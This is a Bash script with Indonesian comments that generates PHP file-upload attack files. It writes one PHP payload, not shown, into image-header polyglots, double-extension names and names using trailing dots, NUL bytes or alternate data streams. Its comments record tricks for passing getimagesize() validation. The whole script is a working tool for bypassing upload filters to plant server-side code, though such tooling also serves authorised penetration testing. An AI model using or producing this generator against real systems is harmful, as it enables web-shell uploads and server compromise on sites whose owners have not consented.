#!/usr/bin/env bash
# build_cmd.sh — generate amunisi PHP file-upload di dir ini.
#
# Sumber (semua di dir ini):
#   payloads.txt      -> 1 baris, payload PHP yang dipakai semua varian
#   ext_core.txt      -> daftar ekstensi   -> x<ext>
#   ext_poly.txt      -> "<ext> <MAGIC>"   -> x<ext> = header image valid + payload
#   ext_double.txt    -> nama file literal -> x.php.png / x.png.php / dst
#   ext_trailing.txt  -> nama literal + escape \xNN / %NN (trailing dot, NUL, newline)
#   imgmagic.py       -> generator header image valid (PNG/GIF/JPG/BMP/WBMP/XBM/SVG/PDF)
#
# JEBAKAN yang sudah ditembak (jangan diulang):
#   1. $(...) / $( ) MEMBUANG byte NUL -> header binary harus lewat FILE/pipe
#      (di sini: python3 imgmagic.py), jangan pernah lewat command substitution.
#   2. printf '%b' dua kali = escape diterjemahkan sekali saja; jangan gandakan.
#   3. SOF0 JPEG wajib lengkap (presisi, h, w, jumlah komponen + 3 byte/komponen)
#      atau getimagesize() balas "Unexpected end of JPEG" walau SOI-nya benar.
set -euo pipefail
cd "$(dirname "$0")"

PAYLOAD_FILE=${PAYLOAD_FILE:-payloads.txt}
PAYLOAD=$(head -n1 "$PAYLOAD_FILE")
BASE=x
IMG="python3 imgmagic.py"

keys_for() { sed -e 's/#.*//' -e 's/[[:space:]]\+/ /g' -e 's/^ //' -e 's/ $//' "$1" | grep -v '^$'; }

# cek dukungan magic; sukses -> header sudah ada di stdout pemanggil
have_magic() { $IMG "$1" >/dev/null 2>&1; }

# --- 1. core: file = payload murni ---
while IFS= read -r ext; do
  printf '%s' "$PAYLOAD" > "${BASE}${ext}"
  echo "  [core] ${BASE}${ext}"
done < <(keys_for ext_core.txt)

# --- 2. polyglot: header image valid + payload ---
while IFS= read -r line; do
  ext=$(echo "$line" | cut -d' ' -f1)
  magic=$(echo "$line" | cut -d' ' -f2- | tr 'A-Z' 'a-z')
  [ -z "$magic" ] && continue
  if have_magic "$magic"; then
    $IMG "$magic" > "${BASE}${ext}"
    printf '%s' "$PAYLOAD" >> "${BASE}${ext}"
    echo "  [poly-$magic] ${BASE}${ext}"
  else
    echo "  [skip-magic:$magic] ${BASE}${ext}"
  fi
done < <(keys_for ext_poly.txt)

# --- 3. double extension: nama LITERAL, magic mengikuti ekstensi TERAKHIR ---
# Nama yang juga terdaftar di ext_poly.txt dilewati di sini (polyglot menang).
poly_names=" $(keys_for ext_poly.txt | cut -d' ' -f1 | sed 's/^/x/;s/$/ /' | tr -d '\n') "
while IFS= read -r raw; do
  name=$(printf '%b' "$raw")
  case "$poly_names" in *" $name "*) echo "  [dbl-skip-poly] $name"; continue ;; esac
  ext="${name##*.}"; ext=$(printf '%s' "$ext" | tr 'A-Z' 'a-z')
  if have_magic "$ext"; then
    $IMG "$ext" > "$name"; printf '%s' "$PAYLOAD" >> "$name"
  else
    printf '%s' "$PAYLOAD" > "$name"
  fi
  echo "  [dbl] $name"
done < <(keys_for ext_double.txt)

# --- 4. tricky: trailing dot / NUL / newline / ADS / mixed-case ---
while IFS= read -r name; do
  out=$(printf '%b' "$name")
  case "$out" in */*) echo "  [skip-traversal] $out"; continue ;; esac
  printf '%s' "$PAYLOAD" > "$out"
  echo "  [tricky] $out"
done < <(keys_for ext_trailing.txt)

echo "selesai."
